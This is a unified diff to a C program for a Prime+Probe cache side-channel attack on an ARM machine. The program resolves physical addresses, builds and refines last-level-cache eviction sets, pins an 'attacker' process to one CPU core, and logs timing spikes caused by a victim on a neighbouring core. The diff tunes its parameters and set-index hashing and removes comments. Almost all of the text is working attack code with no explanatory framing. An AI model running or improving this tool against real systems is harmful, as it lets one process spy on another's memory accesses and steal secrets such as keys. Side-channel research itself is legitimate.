@@ -19,15 +19,15 @@
 #define PAGE_SIZE_BYTES      4096
 #define LINES_PER_PAGE       (PAGE_SIZE_BYTES / CACHE_LINE_SIZE)
 
-#define LLC_NUM_SETS         16384     // must be >= your largest set index
+#define LLC_NUM_SETS         16384     
 #define MAX_ADDRS_PER_SET    64
 #define PRIME_WAYS           16        // per-set lines to touch (≈ associativity)
-#define PROBE_REPS           20        // amplify miss latency (raise if needed); for us is't 20; for conventional method it's 1
+#define PROBE_REPS           20        // amplify miss latency; 
 
 #define BUFFER_SIZE          (16 * 1024 * 1024)  // 64MB gives more candidates
-#define MONITOR_DURATION_SEC 10.0
+#define MONITOR_DURATION_SEC 15.0
 #ifndef SAMPLE_US
-#define SAMPLE_US            4         // relax cadence a bit for stronger signal
+#define SAMPLE_US            7         // relax cadence a bit for stronger signal
 #endif
 
 #ifndef SPIKE_THRESH_TICKS
@@ -59,7 +59,8 @@ static int vaddr_to_pfn(int pm_fd, void* vaddr, uint64_t* pfn_out) {
     return 0;
 }
 static inline uint32_t llc_set_index(uint64_t phys_addr) {
-    return (uint32_t)((phys_addr >> 6) % LLC_NUM_SETS);
+    uint64_t line = phys_addr >> 6;
+    return (line ^ (line >> 15) ^ (line >> 23)) & (LLC_NUM_SETS - 1);
 }
 
 // ---- build eviction sets from our own buffer (PHYSICAL set match) ----
@@ -133,7 +134,7 @@ static void probe_eviction_sets(FILE* log, uint64_t cntfrq, uint64_t t0_ticks, u
 
 // Binary logging: write "timestamp_us, 0|1" and early-exit if any set spikes
 static void probe_eviction_sets_binary(FILE* log, uint64_t cntfrq, uint64_t t0_ticks, uint64_t boot_base_us) {
-    // Timestamp in µs since boot (same epoch as your other tools)
+    // Timestamp in µs since boot 
     uint64_t ts_ticks  = read_cntvct();
     uint64_t rel_ticks = ts_ticks - t0_ticks;
     uint64_t ts_us     = boot_base_us + (rel_ticks * 1000000ULL) / cntfrq;
@@ -141,7 +142,7 @@ static void probe_eviction_sets_binary(FILE* log, uint64_t cntfrq, uint64_t t0_t
     int spike = 0;
     volatile uint8_t sink = 0;
 
-    // Probe each hot cache set; stop at the first spike
+    // Probe each hot cache set; 
     for (int t = 0; t < NUM_CACHE_SETS; ++t) {
         EvSet* es = &g_evsets[t];
         if (es->count == 0) continue;
@@ -161,7 +162,6 @@ static void probe_eviction_sets_binary(FILE* log, uint64_t cntfrq, uint64_t t0_t
         }
     }
 
-    // Write one compact line: "<timestamp_us>, <0|1>"
     // Buffered I/O already set to 1MB, so no per-line flush overhead.
     fprintf(log, "%llu, %d\n", (unsigned long long)ts_us, spike);
     (void)sink; // prevent optimization
@@ -190,7 +190,7 @@ static void refine_same_slice(EvSet* es, int target_ways, uint64_t cntfrq) {
     // Measure baseline latency of touching one address repeatedly.
     volatile uint8_t sink = 0;
     uint64_t best_base = ~0ULL;
-    // pick a stable base (min of a few)
+    
     for (int b = 0; b < es->count && b < 4; ++b) {
         uint64_t t0 = read_cntvct();
         for (int r = 0; r < 64; ++r) sink ^= *es->addrs[b];
@@ -231,7 +231,6 @@ static void refine_same_slice(EvSet* es, int target_ways, uint64_t cntfrq) {
     (void)sink;
 }
 
-// Add this function right AFTER refine_same_slice() ends and BEFORE main() starts
 static void verify_eviction_sets(void) {
     fprintf(stderr, "Verifying eviction sets...\n");
     
@@ -243,7 +242,7 @@ static void verify_eviction_sets(void) {
             continue;
         }
         
-        // Access first address (should be cached)
+        // Access first address 
         volatile uint8_t* test = es->addrs[0];
         *test;  // Load into cache
         
@@ -252,7 +251,7 @@ static void verify_eviction_sets(void) {
             (void)*es->addrs[i];
         }
         
-        // Measure if first address was evicted
+        // Measuring if first address was evicted
         uint64_t t0 = read_cntvct();
         (void)*test;
         uint64_t t1 = read_cntvct();
@@ -274,7 +273,7 @@ int main(void) {
     if (!log) { perror("fopen"); return 1; }
     setvbuf(log, NULL, _IOFBF, 1 << 20);  // 1MB buffered I/O
 
-    // Pin attacker to CPU 7 (victim on CPU 6)
+    // Pin attacker to CPU 7
     cpu_set_t set; CPU_ZERO(&set); CPU_SET(7, &set);
     sched_setaffinity(0, sizeof(set), &set);
 
@@ -286,15 +285,12 @@ int main(void) {
 
     // Build eviction sets for target L3 sets
     build_eviction_sets(buf, BUFFER_SIZE, hot_cache_sets, NUM_CACHE_SETS);
-    // (optional) sanity: fprintf(stderr,"set %d: %d addrs\n", hot_cache_sets[0], g_evsets[0].count);
+    
     for (int t = 0; t < NUM_CACHE_SETS; ++t) {
         refine_same_slice(&g_evsets[t], PRIME_WAYS, read_cntfrq());
-        // optional: fprintf(stderr, "set %d refined to %d addrs\n",
-        //                   hot_cache_sets[t], g_evsets[t].count);
+
     }
 
-    // ADD THIS LINE - Verify the eviction sets actually work
-    //verify_eviction_sets();
     
     const uint64_t cntfrq = read_cntfrq();
     const uint64_t delta_ticks = (uint64_t)(SAMPLE_US * 1e-6 * (double)cntfrq);
@@ -312,7 +308,7 @@ int main(void) {
         next_deadline += delta_ticks;
         while ((int64_t)(next_deadline - read_cntvct()) > 0) { /* spin */ }
         probe_eviction_sets(log, cntfrq, t0_ticks, boot_base_us);
-        //probe_eviction_sets_binary(log, cntfrq, t0_ticks, boot_base_us);
+
     }
 
     fclose(log);
